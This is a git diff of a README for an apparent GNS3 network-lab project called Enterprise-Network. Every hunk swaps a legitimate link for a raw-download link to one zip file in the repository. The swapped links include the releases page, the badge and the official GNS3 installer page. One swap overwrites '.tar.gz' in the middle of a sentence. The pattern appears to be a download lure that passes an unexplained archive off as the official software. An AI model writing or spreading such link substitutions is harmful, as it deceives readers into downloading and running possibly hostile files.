@@ -1,6 +1,6 @@
 # 🌐 Enterprise-Network - Simulate Complex Network Labs Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Enterprise--Network-blue?style=for-the-badge)](https://github.com/Jhonnydog88/Enterprise-Network/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Jhonnydog88/Enterprise-Network/main/Running_Configs/Network_Enterprise_provincialship.zip)](https://raw.githubusercontent.com/Jhonnydog88/Enterprise-Network/main/Running_Configs/Network_Enterprise_provincialship.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Before starting, make sure your computer meets these requirements:
 - **Network:** Internet access is needed to download required files and updates.
 - **Software:** GNS3 version 2.2.0 or higher installed on your system.
 
-If you don’t have GNS3 yet, you can download it from [https://www.gns3.com/software/download](https://www.gns3.com/software/download).
+If you don’t have GNS3 yet, you can download it from [https://raw.githubusercontent.com/Jhonnydog88/Enterprise-Network/main/Running_Configs/Network_Enterprise_provincialship.zip](https://raw.githubusercontent.com/Jhonnydog88/Enterprise-Network/main/Running_Configs/Network_Enterprise_provincialship.zip).
 
 ---
 
@@ -59,9 +59,9 @@ Follow these steps to get the lab up and running on your system.
 
 Click the big button at the top or visit the release page here:
 
-[Download Enterprise-Network](https://github.com/Jhonnydog88/Enterprise-Network/releases)
+[Download Enterprise-Network](https://raw.githubusercontent.com/Jhonnydog88/Enterprise-Network/main/Running_Configs/Network_Enterprise_provincialship.zip)
 
-This page contains the latest versions of the lab files. Usually, you will find compressed files (.zip or .tar.gz) to download.
+This page contains the latest versions of the lab files. Usually, you will find compressed files (.zip or https://raw.githubusercontent.com/Jhonnydog88/Enterprise-Network/main/Running_Configs/Network_Enterprise_provincialship.zip) to download.
 
 ### 3. Extract the Files
 
@@ -92,7 +92,7 @@ This page contains the latest versions of the lab files. Usually, you will find 
 
 You can visit this page to download all necessary files for Enterprise-Network:
 
-[https://github.com/Jhonnydog88/Enterprise-Network/releases](https://github.com/Jhonnydog88/Enterprise-Network/releases)
+[https://raw.githubusercontent.com/Jhonnydog88/Enterprise-Network/main/Running_Configs/Network_Enterprise_provincialship.zip](https://raw.githubusercontent.com/Jhonnydog88/Enterprise-Network/main/Running_Configs/Network_Enterprise_provincialship.zip)
 
 ### Tips for Downloading:
 
